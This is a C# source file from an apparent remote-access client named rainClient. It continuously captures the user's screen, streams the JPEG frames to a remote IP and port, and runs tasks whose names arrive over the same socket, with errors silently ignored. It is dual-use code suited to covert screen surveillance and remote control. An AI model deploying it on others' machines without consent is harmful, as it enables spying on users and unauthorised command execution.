using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.IO;
using System.Net;
using System.Drawing;
using rainClient.task;
using System.Net.Sockets;
using System.Windows.Forms;

namespace rainClient.threadSocket
{
    class videoSocket : baseThreadSocket
    {
        public int sleep { get; set; }

        public videoSocket(byte[] buffer) : base(buffer)
        {
            sleep = 300;
        }

        public override void startProces(string ip, int port)
        {
            soc = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics g = Graphics.FromImage(bmp);
            MemoryStream streem;

            try
            {
                soc.Connect(IPAddress.Parse(ip), port);
                Console.WriteLine("Video socket connected!");

                Task.Run(() => {
                    try
                    {
                        MemoryStream mS;

                        for (; ; )
                        {
                            mS = new MemoryStream(buffer);
                            soc.Receive(buffer);
                            using (BinaryReader sr = new BinaryReader(mS))
                            {
                                baseTask.createTask(sr.ReadString()).startProces(sr.ReadString());
                            }
                        }
                    }
                    catch { }
                });

                for (; ; )
                {
                    streem = new MemoryStream();                    
                    g.CopyFromScreen(Point.Empty, Point.Empty, Screen.PrimaryScreen.Bounds.Size);
                    bmp.Save(streem, System.Drawing.Imaging.ImageFormat.Jpeg);                    
                    soc.Send(streem.ToArray());
                    streem.Close();
                    System.Threading.Thread.Sleep(sleep);
                }
            }
            catch
            {
                Console.WriteLine("videoSocket error");
            }
            finally
            {
                soc.Close();
                GC.Collect();
            }
        }
    }
}
